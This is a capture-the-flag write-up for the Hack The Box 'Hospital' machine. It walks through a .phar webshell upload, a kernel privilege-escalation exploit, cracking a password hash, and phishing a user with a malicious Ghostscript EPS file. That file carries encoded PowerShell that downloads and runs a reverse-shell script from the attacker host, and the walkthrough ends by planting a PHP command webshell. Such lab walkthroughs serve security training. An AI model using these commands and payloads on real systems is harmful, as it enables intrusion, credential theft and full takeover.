---
layout: writeup
category: HTB
points: 30
solves: 4397
tags: webshell_upload kernel_exploits hash_cracking pivoting phishing ghostscript_rce
description: In this machine, we have a web service vulnerable to webshell upload in which we have to bypass the filters using a .phar file instead of .php and we gain access to another machine in the same network which is linux instead of Windows. Then, we have to use [CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629) to exploit a kernel vulnerability and have access as root. Later, we can extract drwilliams password from /etc/shadow hash to gain access to roundcube webmail service. When we have access to that mail service, we have a inbox message of drbrown that saids us to send a .eps file to open with Ghostscript, so we can do phishing to send him a malicious file that exploits [CVE-2023-36664](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection). Then, we try to access to the one who owns the xampp https server and we gain access as nt authority/system.
date: 2024-04-08
comments: false
title: HTB Hospital Writeup
---

## Enumeration
I will start with a basic port scanning with nmap:

```bash
❯ nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN tcpTargeted 10.10.11.241
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-08 21:46 CEST
Host is up (0.12s latency).
Not shown: 65508 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-04-08 00:59:54Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
|_http-favicon: Unknown favicon MD5: 924A68D347C80D0E502157E83812BB23
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2024-04-08T01:00:51+00:00
| ssl-cert: Subject: commonName=DC.hospital.htb
| Issuer: commonName=DC.hospital.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-04-06T02:29:31
| Not valid after:  2024-10-06T02:29:31
| MD5:   4ebb:2d92:c0f4:22fb:50ad:3411:c908:a58c
|_SHA-1: 3090:c8e0:e245:4e1c:8480:4fc0:f2fa:7a14:2ced:4a38
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6404/tcp open  msrpc             Microsoft Windows RPC
6406/tcp open  msrpc             Microsoft Windows RPC
6409/tcp open  msrpc             Microsoft Windows RPC
6631/tcp open  msrpc             Microsoft Windows RPC
6647/tcp open  msrpc             Microsoft Windows RPC
8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.55 (Ubuntu)
9389/tcp open  mc-nmf            .NET Message Framing
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
| smb2-time: 
|   date: 2024-04-08T01:00:53
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
## Nmap done at Sun Apr  7 20:01:34 2024 -- 1 IP address (1 host up) scanned in 131.25 seconds
```

* -sVC: Identifies service and version.
* -p-: scans all the range of ports (1-65535).
* --open: shows only open ports and not filtered or closed.
* -sS: TCP SYN scan that improves velocity because it doesn't establish the connection.
* --min-rate 5000: Sends 5000 packets per second to improve velocity (don't do this in a real environment).
* -n: Disables DNS resolution protocol.
* -Pn: Disables host discovery protocol (ping).
* -oN targeted: Exports the evidence to a file named "tcpTargeted".

We can try to enumerate the active directory services without credentials but we don't have access.

Let's try to enumerate the web services: 8080(http), 443(https). We start with the port 443:

```bash
❯ whatweb https://10.10.11.241
https://10.10.11.241 [200 OK] Apache[2.4.56], Bootstrap, Content-Language[en], Cookies[roundcube_sessid], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28], HttpOnly[roundcube_sessid], IP[10.10.11.241], JQuery, OpenSSL[1.1.1t], PHP[8.0.28], PasswordField[_pass], RoundCube, Script, Title[Hospital Webmail :: Welcome to Hospital Webmail], UncommonHeaders[x-robots-tag], X-Frame-Options[sameorigin], X-Powered-By[PHP/8.0.28]
```

![Branching](/assets/images/Hospital/roundcube.png)

It's a roundcube webmail service which we can't access because we don't have credentials.

Now let's see port 8080:

```bash
❯ whatweb http://10.10.11.241:8080
http://10.10.11.241:8080 [302 Found] Apache[2.4.55], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.55 (Ubuntu)], IP[10.10.11.241], RedirectLocation[login.php]
http://10.10.11.241:8080/login.php [200 OK] Apache[2.4.55], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.55 (Ubuntu)], IP[10.10.11.241], JQuery[3.2.1], PasswordField[password], Script, Title[Login]
```

We can see that it works with PHP, it has a login field, and it is a ubuntu server which is a weird thing due to the fact that the machine is supposed to be Windows. Probably, when we gain access to the webserver, we will have access to a container or something similar.

Let's open the web now in the browser, it looks like this:

![Branching](/assets/images/Hospital/web_main.png)

## Access as www-data to linux machine

Now i will proceed to register a new user and login and we have access to an upload file functionality:

![Branching](/assets/images/Hospital/upload_func.png)

I will start testing this functionality uploading the file that it is supposed to be uploaded named "example.jpeg" and it redirects me to success.php showing me that the file has successfully uploaded:

![Branching](/assets/images/Hospital/success.png)

Now let's try to discover the folder that contains the uploaded files with wfuzz:

```bash
❯ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/common.txt http://10.10.11.241:8080/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.241:8080/FUZZ
Total requests: 4727

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000025:   403        9 L      28 W       279 Ch      ".htpasswd"                                                                                                            
000000024:   403        9 L      28 W       279 Ch      ".htaccess"                                                                                                            
000000023:   403        9 L      28 W       279 Ch      ".hta"                                                                                                                 
000001334:   301        9 L      28 W       317 Ch      "css"                                                                                                                  
000001838:   301        9 L      28 W       319 Ch      "fonts"                                                                                                                
000002202:   302        0 L      0 W        0 Ch        "index.php"                                                                                                            
000002174:   301        9 L      28 W       320 Ch      "images"                                                                                                               
000002358:   301        9 L      28 W       316 Ch      "js"                                                                                                                   
000003723:   403        9 L      28 W       279 Ch      "server-status"                                                                                                        
000004326:   301        9 L      28 W       321 Ch      "uploads"                                                                                                              
000004394:   301        9 L      28 W       320 Ch      "vendor"                                                                                                               

Total time: 46.53538
Processed Requests: 4727
Filtered Requests: 4716
Requests/sec.: 101.5786
```

We have an uploads folder so let's see if we have the same name that we uploaded in that folder:

![Branching](/assets/images/Hospital/discovered_upload_path.png)

So now that we know how the uploaded files are stored on webserver, the next thing i will do is see if we can upload a PHP file, i will test it with Burp Repeater for saving time:

![Branching](/assets/images/Hospital/failed_upload_php.png)

It redirects me to /failed.php so it has not succeeded. If we try some common extension bypasses, we can realize that the .phar extension is allowed:

![Branching](/assets/images/Hospital/phar_allowed.png)

Now i will see phpinfo disable_functions to see if there is some disable_functions that prevents me command execution:

![Branching](/assets/images/Hospital/disable_functions.png)

Searching in google we found [this page](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass) in which we can see that we can bypass this with the function fread and popen because they are not disabled in phpinfo. I will test it:

![Branching](/assets/images/Hospital/uploading_final_phar.png)

![Branching](/assets/images/Hospital/testing_final_phar.png)

Now i will proceed to establish a reverse shell connection:

![Branching](/assets/images/Hospital/establish_shell.png)

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.124] from (UNKNOWN) [10.10.11.241] 6526
bash: cannot set terminal process group (981): Inappropriate ioctl for device
bash: no job control in this shell
www-data@webserver:/var/www/html/uploads$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@webserver:/var/www/html/uploads$ ^Z
zsh: suspended  nc -lvnp 443
                                                                                                                                                                                        
❯ stty raw -echo;fg
[1]  + continued  nc -lvnp 443
                    reset xterm
www-data@webserver:/var/www/html/uploads$ export TERM=xterm
www-data@webserver:/var/www/html/uploads$ export SHELL=bash
```

* ``script /dev/null -c bash``: Spawns a tty
* ``ctrl+z``: puts the shell in background for later doing a treatment
* ``stty raw -echo;fg``: give us the shell back again
* ``reset xterm``: resets the terminal to give us the bash console
* ``export TERM=xterm``: let us do ctrl+l to clean the terminal
* ``export SHELL=bash``: specifies the system that we are using a bash console

However we gained access to another linux machine in the same network but not the host one:

```bash
www-data@webserver:/var/www/html/uploads$ ifconfig eth0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.5.2  netmask 255.255.255.0  broadcast 192.168.5.255
        inet6 fe80::215:5dff:fe00:8a02  prefixlen 64  scopeid 0x20<link>
        ether 00:15:5d:00:8a:02  txqueuelen 1000  (Ethernet)
        RX packets 637  bytes 51517 (51.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 411  bytes 495806 (495.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

## Access as root to linux server

The kernel version is vulnerable to [CVE-2023-2640 and CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629), so we can exploit it and gain access as root:

#### Attacker
```bash
❯ ls -l exploit.sh
-rw-r--r-- 1 gabri gabri 558 abr  8 18:23 exploit.sh
                                                                                                                                                                                        
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

#### Victim
```bash
www-data@webserver:/var/www/html/uploads$ cd /tmp/
www-data@webserver:/tmp$ wget http://10.10.14.124/exploit.sh
--2024-04-09 22:51:15--  http://10.10.14.124/exploit.sh
Connecting to 10.10.14.124:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 558 [text/x-sh]
Saving to: 'exploit.sh'

exploit.sh          100%[===================>]     558  --.-KB/s    in 0s      

2024-04-09 22:51:15 (27.2 MB/s) - 'exploit.sh' saved [558/558]

www-data@webserver:/tmp$ chmod +x exploit.sh 
www-data@webserver:/tmp$ ./exploit.sh 
[+] You should be root now
[+] Type 'exit' to finish and leave the house cleaned
root@webserver:/tmp## whoami
root
```

## Access to windows machine as drbrown

Now that we have access as root in the linux machine, we can try to crack the hash of /etc/shadow.

```bash
root@webserver:/tmp## cat /etc/shadow | grep "drwilliams"
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
```

```bash
❯ cat drwilliams.hash
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: drwilliams.hash
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ $6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

❯ john -w=/usr/share/wordlists/rockyou.txt drwilliams.hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
qwe123!@##        (?)     
1g 0:00:00:15 DONE (2024-04-09 18:02) 0.06285g/s 13516p/s 13516c/s 13516C/s rufus11..pakimo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now that we have that password, let's try to reuse it to roundcube webmail service and see if we can see his mails:

![Branching](/assets/images/Hospital/mail_drbrown_eps.png)

We have access and we can see that there is a mail of drbrown that want us to send a .eps file that can be opened with Ghostscript.

Searching in google for ghostscript exploits we end on [this page](https://vsociety.medium.com/cve-2023-36664-command-injection-with-ghostscript-poc-exploit-97c1badce0af) that explains how we can create a malicious eps file that executes commands on victim.

I will craft one that retrieves me a shell downloading and executing the content of the [script Invoke-ConPtyShell](https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1) to gain access to a fully interactive reverse shell in windows.

> I recommend to open a new window of the terminal to receive the windows ConPtyShell and specify the rows and columns of that new window for having the best experience.


```bash
❯ stty size
44 184

❯ echo "IEX(New-Object Net.WebClient).downloadString(\"http://<Your IP>/Invoke-ConPtyShell.ps1\"); Invoke-ConPtyShell -RemoteIp <Your IP> -RemotePort <Your Port> -Rows <Your rows of terminal> -Cols <Columns of terminal>" | iconv -t utf16le | base64 -w 0
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAMgA0AC8ASQBuAHYAbwBrAGUALQBDAG8AbgBQAHQAeQBTAGgAZQBsAGwALgBwAHMAMQAiACkAOwAgAEkAbgB2AG8AawBlAC0AQwBvAG4AUAB0AHkAUwBoAGUAbABsACAALQBSAGUAbQBvAHQAZQBJAHAAIAAxADAALgAxADAALgAxADQALgAxADIANAAgAC0AUgBlAG0AbwB0AGUAUABvAHIAdAAgADQANAAzACAALQBSAG8AdwBzACAANAA0ACAALQBDAG8AbABzACAAMQA4ADQACgA=                                                                                                                                                                                        
❯ payload="powershell -enc <Your payload of above>"
                                                                                                                                                                                        
❯ python3 ghostscript_exploit.py --generate --payload "$payload" --filename project --extension eps
[+] Generated EPS payload file: project.eps
```

Now spawn a nc listener on the port you specified, a python webserver to interpret the Invoke-ConPtyShell from the victim's machine, send the file to drbrown and wait for reverse shell:

![Branching](/assets/images/Hospital/file_sended.png)

You have to receive a request to your Invoke-ConPtyShell.ps1 and receive the shell on the nc listener. When you receive the shell, just hit enter, press ctrl+z, put the command ``stty raw -echo;fg``, hit enter and press ctrl+l. In this way we have a fully interactive reverse shell and we can do ctrl+c, we have autocompletion and whatever we want. 

Now we can see user.txt:

```powershell
PS C:\Users\drbrown.HOSPITAL> cd .\Desktop\
PS C:\Users\drbrown.HOSPITAL\Desktop> type .\user.txt
e2****************************51
```

## Privilege escalation on windows machine

This privilege escalation is very simple and easy. We just have to place a php reverse shell on the roundcube webmail service because the one who is running the https service is Administrator. There is no way to come to that conclusion, we just have to try it to see from which user we receive the shell.

```powershell
PS C:\Users\drbrown.HOSPITAL\Documents> cd C:\xampp\htdocs\    
PS C:\xampp\htdocs> Add-Content -Path reverse.php -Value '<?php system($_GET["cmd"]); ?>'
```

Use the same payload that we crafted before of ConPtyShell (remember to spawn the python server) and wait for reverse shell:

![Branching](/assets/images/Hospital/final_shell.png)

Now we can see root.txt flag

```powershell
PS C:\xampp\htdocs> whoami
nt authority\system
PS C:\xampp\htdocs> cd C:\Users\Administrator\Desktop\ 
PS C:\Users\Administrator\Desktop> type .\root.txt 
4d****************************72
```

That is the machine, hope you liked it :).
